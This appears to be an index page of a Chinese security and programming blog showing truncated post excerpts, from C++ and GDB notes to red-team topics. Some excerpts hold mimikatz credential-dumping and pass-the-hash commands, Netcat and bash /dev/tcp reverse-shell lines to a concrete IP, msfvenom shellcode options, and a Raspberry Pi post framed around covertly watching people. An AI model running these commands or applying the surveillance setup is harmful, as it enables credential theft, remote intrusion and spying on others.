class="article-meta__tags" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/mimikatz/">mimikatz</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

只记录自己用过的命令
常用的命令

常规抓hash

privilege::debugsekurlsa::logonpasswords 

注册列表抓hash

reg save HKLM\SYSTEM SYSTEMreg save HKLM\SAM SAMlsadump::sam /sam:SAM /system:SYSTEM

PTH登录

sekurlsa::pth /user:administrator /domain:ascotbe.com /ntlm:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXdir \\10.0.0.1\c$

procdump

有些情况下🥝是无法抓取到hash的，会提示ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)错误，可以使用procdump64+mimikatz来解决，前提是wi ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/03/31/raspberry_monitor_0x02/" title="利用树莓派来监听任务目标(下)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/90.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="利用树莓派来监听任务目标(下)"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/03/31/raspberry_monitor_0x02/" title="利用树莓派来监听任务目标(下)">利用树莓派来监听任务目标(下)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-31T14:57:46.000Z" title="发表于 2020-03-31 22:57:46">2020-03-31</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/">树莓派</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%9B%91%E5%90%AC/">监听</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

距离上次的上篇已经过去了小半年时间了，真的不是我咕咕了，是因为自己挖的坑有点多，本片文章主要介绍的是如何对人脸进行检测和检测后的通讯方式，树莓派zeor w性能有点更不上所以我又买了4B（小声BB可能还有终篇


硬件清单


读卡器以及 SD 卡
树莓派官方摄像头一枚（夜视版
树莓派4B
电源(实际场景需要装个充电宝或者使用定制的电源)
监听模块(如果想要带上声音可以装个)


安装python-opencv

更新树莓派系统
在这之前记得话pip源 、apt源、系统更新源换成国内的，并且使用树莓派4并且刷入最新版的包，刷入包的哈希值
SHA-256:c9c382b659bd96b859ccb9e2ac0c2292a91a37c286ab464f2f380d451077663d
sudo apt-get updatesudo apt-get upgrade
安装python-OpenCV
在这之前还需要把系统自带的p ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/03/23/PortableExecutable/" title="Windows PE结构解析"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/89.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Windows PE结构解析"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/03/23/PortableExecutable/" title="Windows PE结构解析">Windows PE结构解析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-23T15:45:42.000Z" title="发表于 2020-03-23 23:45:42">2020-03-23</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/PE/">PE</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言
不管你是逆向领域，还是开发领域，异或是病毒编写者（红蓝对抗），都需要对PE文件有详细的了解，由于自己是个菜逼然后需要用到修改PE结构来达到某些免杀的操作，既然这样我就祭出菜逼大杀器Google百度来自行学习，本篇文章主要都是摘抄各位师傅们的文章，加上菜逼我的理解混合在一起的，如果有哪些地方理解错了或者填错了请各位师傅斧正！！

总体介绍
可执行文件(Executable File)是指可以由操作系统直接加载执行的文件，在Windows操作系统中可执行文件就是PE文件结构，在Linux下则是ELF文件，下面这张图就是PE文件格式的图片(来自看雪)，非常大一张图片，其实PE格式就是各种结构体的结合，Windows下PE文件的各种结构体在WinNT.h这个头文件中，可以在VS（宇宙无敌第一编译器）中查询。

PE文件整体结构
PE结构可以大致分为:

DOS部分
PE文件头
节表(块表)
节数据(块数据)
调试信息

依旧用看雪 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/03/16/C++NamingConvention/" title="C++命名规范"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/88.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="C++命名规范"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/03/16/C++NamingConvention/" title="C++命名规范">C++命名规范</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-16T13:45:42.000Z" title="发表于 2020-03-16 21:45:42">2020-03-16</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.611Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/C-%E5%91%BD%E5%90%8D%E8%A7%84%E8%8C%83/">C++命名规范</a></span></div><div class="content">前言
首先命名要可读，这是所有规则的公理！！！！！尽可能使用描述性的命名, 别心疼空间, 毕竟相比之下让代码易于新读者理解更重要. 不要用只有项目开发者能理解的缩写, 也不要通过砍掉几个字母来缩写单词。
本篇作为学习笔记，约束自己
文件命名
文件名全部都要小写并且包含下划线(_)
可接受的文件命名示例:

my_useful_class.cc
http_server_logs.h

C++ 文件要以 .cc 结尾, 头文件以 .h 结尾. 专门插入文本的文件则以 .inc 结尾
通常应尽量让文件名更加明确. http_server_logs.h 就比 logs.h 要好
类型命名
类型名称的每个单词首字母均大写, 不包含下划线: MyExcitingClass, MyExcitingEnum.
变量命名


普通变量命名
单词全小写并且用下划线(_)隔开，和文件命名类似，必须要让命名可读，并且明确。
string table_name;string user_name_read;


类数据成员
再普通的变量名前面加上c_作为开头
class TableInfo &#123;  ... ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/03/07/Basics/" title="免杀基础"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/2.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="免杀基础"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/03/07/Basics/" title="免杀基础">免杀基础</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-03-07T13:45:42.000Z" title="发表于 2020-03-07 21:45:42">2020-03-07</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.870Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%9C%A8%E9%A9%AC/">木马</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%97%85%E6%AF%92/">病毒</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/Metasploit/">Metasploit</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/CobaltStrike/">CobaltStrike</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言
踩着大佬们的脚步，用自己蹩脚的C++功底复现了师傅给出的一些免杀方案。后续将给出自己的两个免杀方案，复现大佬们的这几个方案用了3天时间，我真的是菜的可怜。

生成ShellCode的方法


使用msfvenom生成的ShellCode


使用参数说明
-l, --list            &lt;type&gt;     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all-p, --payload         &lt;payload&gt;  要使用的有效载荷-f, --format          &lt;format&gt;   输出格式,输出的语言类型-e, --encoder         &lt;encoder&gt;  要使用的编码器- ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2019/12/21/raspberry_monitor_0x01/" title="利用树莓派来监听任务目标(上)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/33.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="利用树莓派来监听任务目标(上)"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/12/21/raspberry_monitor_0x01/" title="利用树莓派来监听任务目标(上)">利用树莓派来监听任务目标(上)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-12-21T04:57:46.000Z" title="发表于 2019-12-21 12:57:46">2019-12-21</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.611Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/">树莓派</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%9B%91%E5%90%AC/">监听</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

&quot;黑客&quot;注重的是隐蔽高效的攻陷目标，那么前期的信息收集，以及踩点就是非常重要的了，如何使用树莓派来&quot;监控&quot;目标对象？
当你想知道某个地方的他在做什么？想要知道家里面是否进了小偷？
家里的那个她是否给你带了绿帽子？（写到这里我哭了出来，为什么我没有女朋友！哇~）


硬件清单


读卡器以及 SD 卡
摄像头一枚
SSH连接工具
域名一个
带公网服务器一台
电源(实际场景需要装个充电宝或者使用定制的电源)
监听模块(如果想要带上声音可以装个)

成品图是这样的

刷系统以及换源之类的可以看我另一篇文章，这里就不做其他概述了！

开启摄像头模块

进入配置中
sudo raspi-config
选择Interfacing Options

接着选择Camera

然后他问会问你是否同意使用pi camera，选择是重启就好了
重启后查看监控模块是否开启了，如何和乡土一样就表示没问题了 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2019/12/08/GDB/" title="GDB详细使用介绍"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/32.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="GDB详细使用介绍"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/12/08/GDB/" title="GDB详细使用介绍">GDB详细使用介绍</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-12-08T15:59:59.000Z" title="发表于 2019-12-08 23:59:59">2019-12-08</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.870Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/GDB/">GDB</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

使用GDB
启动
SH$ gdb program           # program是你的可执行文件，一般在当前目录$ gdb program core      # gdb同时调试运行程序和core文件，core是程序非法执行产生的文件$ gdb program pid       # 如果你的程序是一个服务程序，那么你可以指定这个服务程序运行时的进程ID。gdb会自动attach上去，并调试他。program应该在PATH环境变量中搜索得到。
运行
SH(gdb) r/run             # 开始运行程序(gdb) c/continue        # 继续运行(gdb) n/next            # 下一行，不进入函数调用(gdb) s/step            # 下一行，进入函数调用(gdb) ni/si             # 吓一跳指令，ni和si区别同上(gdb) fini/ ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2019/12/03/C++Regular/" title="C++正则规则"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/30.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="C++正则规则"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/12/03/C++Regular/" title="C++正则规则">C++正则规则</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-12-03T15:58:53.000Z" title="发表于 2019-12-03 23:58:53">2019-12-03</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.870Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/C/">C++</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%AD%A3%E5%88%99/">正则</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

常用的元字符：
.： 匹配除\n之外的任何单个字符，若要匹配包括\n在内的任意字符，需使用诸如[\s\S]之类的模式；
^：匹配输入字符串的开始位置，不匹配任何字符，要匹配^字符本身，需使用\^；
$：匹配输入字符串结尾的位置，不匹配任何字符，要匹配$字符本身，需使用\$；
*： 零次或多次匹配前面的字符或子表达式，*等效于&#123;0,&#125;，如\^*b可以匹配b、^b、^^b、…；
+： 一次或多次匹配前面的字符或子表达式，等效于&#123;1,&#125;，如a+b可以匹配ab、aab、aaab、…；
?： 零次或一次匹配前面的字符或子表达式，等效于&#123;0,1&#125;，如a[cd]?可以匹配a、ac、ad； 当此字符紧随任何其他限定符*、+、?、&#123;n&#125;、&#123;n,&#125;、&#123;n,m&#125;之后时，匹配模式是非贪心的。非贪心的模式匹配搜索到的、尽可能短的字符串， ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2019/11/21/TheDifferenceBetweenC++NewAndMalloc/" title="c++ new和malloc的区别"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/99.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="c++ new和malloc的区别"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/11/21/TheDifferenceBetweenC++NewAndMalloc/" title="c++ new和malloc的区别">c++ new和malloc的区别</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-11-21T13:45:12.000Z" title="发表于 2019-11-21 21:45:12">2019-11-21</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.870Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/C/">C++</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

1. 申请的内存所在位置
new操作符从自由存储区（free store）上为对象动态分配内存空间，而malloc函数从堆上动态分配内存。自由存储区是C++基于new操作符的一个抽象概念，凡是通过new操作符进行内存申请，该内存即为自由存储区。而堆是操作系统中的术语，是操作系统所维护的一块特殊内存，用于程序的内存动态分配，C语言使用malloc从堆上分配内存，使用free释放已分配的对应内存。
那么自由存储区是否能够是堆（问题等价于new是否能在堆上动态分配内存），这取决于operator new 的实现细节。自由存储区不仅可以是堆，还可以是静态存储区，这都看operator new在哪里为对象分配内存。
特别的，new甚至可以不为对象分配内存！定位new的功能可以办到这一点：
new (place_address) type
place_address为一个指针，代表一块内存的地址。当使用上面这种仅以一个地址调用new操作符时 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2019/11/14/C++GetInstalledProgramNotes/" title="C++ 获取已安装程序笔记"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/28.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="C++ 获取已安装程序笔记"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/11/14/C++GetInstalledProgramNotes/" title="C++ 获取已安装程序笔记">C++ 获取已安装程序笔记</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-11-14T13:45:12.000Z" title="发表于 2019-11-14 21:45:12">2019-11-14</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.849Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/C/">C++</a></span></div><div class="content">在Windows系统中，已安装软件的信息都保存在注册表中
那种绿色免安装包还不知道怎么获取
32位系统存在以下两个位置：
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\UninstallHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
64位系统在32位系统上多出一处，也就是WOW6432Node的节点下
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall
如何区分哪个是补丁哪个是安装程序
1.如果注册表项下面有&quot;SystemComponent&quot;字段并且值等于1时，表示这是个系统组件，而不是应用软件。2.如果注册表项下面有&quot;ParentKeyName&quot;字段则表示该项是某个分类下的子项，一般情况补丁才会有&quot;ParentKeyName&quot;字段。比如这个&qu ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2019/11/13/typedef/" title="C++ Typedef用法"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/20.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="C++ Typedef用法"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/11/13/typedef/" title="C++ Typedef用法">C++ Typedef用法</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-11-13T13:45:12.000Z" title="发表于 2019-11-13 21:45:12">2019-11-13</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.611Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/C/">C++</a></span></div><div class="content">C++ Typedef用法
用途一：
定义一种类型的别名，而不只是简单的宏替换。可以用作同时声明指针型的多个对象。比如：
char* pa, pb; // 这多数不符合我们的意图，它只声明了一个指向字符变量的指针， 和一个字符变量；
以下则可行：
typedef char* PCHAR;PCHAR pa, pb; 
这种用法很有用，特别是char* pa, pb的定义，初学者往往认为是定义了两个字符型指针，其实不是，而用typedef char* PCHAR就不会出现这样的问题，减少了错误的发生。
用途二:
用在旧的C代码中，帮助struct。以前的代码中，声明struct新对象时，必须要带上struct，即形式为： struct 结构名对象名，如：
struct tagPOINT1 &#123;    int x;    int y; &#125;;struct tagPOINT1 p1;
而在C++中，则可以直接写：结构名对象名，即：tagPOINT1 p1;
typedef struct tagPOINT&#123;    int x;    int y;&#125;POINT; ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2019/10/12/LinuxInstallJavaEnvironment/" title="Linux安装java环境"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/12.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux安装java环境"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/10/12/LinuxInstallJavaEnvironment/" title="Linux安装java环境">Linux安装java环境</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-10-11T16:00:00.000Z" title="发表于 2019-10-12 00:00:00">2019-10-12</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/java%E7%8E%AF%E5%A2%83/">java环境</a></span></div><div class="content">通用系统安装

下载完成后解压到指定文件下

先创建java文件目录，如果已存在就不用创建mkdir -p /usr/local/java

解压到java文件目录

tar -vzxf jdk-8u161-linux-x64.tar.gz -C /usr/local/java/

添加环境变量，编辑配置文件

vi /etc/profile

在文件最下方或者指定文件添加

export JAVA_HOME=/usr/local/java/jdk1.8.0_161export CLASSPATH=$:CLASSPATH:$JAVA_HOME/lib/export PATH=$PATH:$JAVA_HOME/bin

保存退出

source /etc/profile

最后测试

java -version

可以看到一下信息则表示配置成功

java version “1.8.0_161”Java™ SE Runtime Environment (build 1.8.0_161-b12)Java HotSpot™ 64-Bit Server VM (build 25.161-b12 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2019/08/19/NetcatReboundShell/" title="Netcat反弹Shell详解"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/29.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Netcat反弹Shell详解"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/08/19/NetcatReboundShell/" title="Netcat反弹Shell详解">Netcat反弹Shell详解</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-08-19T14:51:42.000Z" title="发表于 2019-08-19 22:51:42">2019-08-19</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.827Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/Netcat/">Netcat</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

Windows

进入下载地址下载文件https://eternallybored.org/misc/netcat/
将文件夹中的对应可执行文件复制到C:\Windows\System32的文件夹下(有32位版和64位版)
直接打开cmd输入nc XXXXXX执行就好

Linux

直接使用nc命令就好

自己常用的命令

Windows

nc -e cmd.exe -d IP port(靶机)

Linux

nc -lvvp 8080(监听机)  监听8080端口nc IP Port (受害者机)   IP为监听机的IP 端口为监听机开的端口bash -i &gt;&amp; /dev/tcp/3.16.30.73/1231 0&gt;&amp;1(受害者机)
主要参数
#无命令行界面,使用后台模式-d#程序重定向 -e#源路由跳跃点, 不超过8-g#源路由指示器: 4, 8, 12, ...-G       #获取帮助 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2019/08/15/Docker/" title="Docker笔记"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/24.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Docker笔记"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/08/15/Docker/" title="Docker笔记">Docker笔记</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-08-15T13:01:07.000Z" title="发表于 2019-08-15 21:01:07">2019-08-15</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.611Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Docker/">Docker</a></span></div><div class="content">安装docker
sudo apt install docker.io
问题解决
0x01 运行docker-compose 命令报错解决办法
-bash: docker-compose: command not found

安装

先安装 pip ，检查是否已有： pip -V 

报错

-bash: pip: command not found

安装 pip 

sudo apt-get install epel-releasesudo apt-get install python-pip

升级

pip install --upgrade pip

安装Docker-Compose

pip install docker-compose

检查是是否成功

docker-compose -version
0x02 使用docker-compose报错找不到 ssl_match_hostname解决办法

进入backports模块路径

cd /usr/local/lib/python2.7/dist-packages

复制整个包到transport包路径下

cp - ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2019/05/26/ReleaseExeResourceFiles/" title="如何释放存在EXE上的资源文件"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/26.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="如何释放存在EXE上的资源文件"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/05/26/ReleaseExeResourceFiles/" title="如何释放存在EXE上的资源文件">如何释放存在EXE上的资源文件</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-05-26T04:33:42.000Z" title="发表于 2019-05-26 12:33:42">2019-05-26</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.633Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/C/">C++</a></span></div><div class="content">添加资源到项目中
直接参考图片就行

生成EXE文件
下载ResourceHacker程序
把程序导入ResourceHacker中

使用FindResource函数提取PE资源
类型为SETIMG
LPCWSTR b = _T(&quot;SETIMG&quot;);HMODULE hLocalHostModule = GetModuleHandleA(NULL);HRSRC hRsrc = FindResource(hLocalHostModule, (LPCTSTR)106, b);
</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2019/02/10/MakingPhishingDocumentsUsingUnicode/" title="利用Unicode实现钓鱼文件制作"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/17.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="利用Unicode实现钓鱼文件制作"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/02/10/MakingPhishingDocumentsUsingUnicode/" title="利用Unicode实现钓鱼文件制作">利用Unicode实现钓鱼文件制作</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-02-10T02:31:40.000Z" title="发表于 2019-02-10 10:31:40">2019-02-10</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.827Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%92%93%E9%B1%BC/">钓鱼</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a></span></div><div class="content">关于Unicode
Unicode（统一码、万国码、单一码）是计算机科学领域里的一项业界标准，包括字符集、编码方案等。Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。
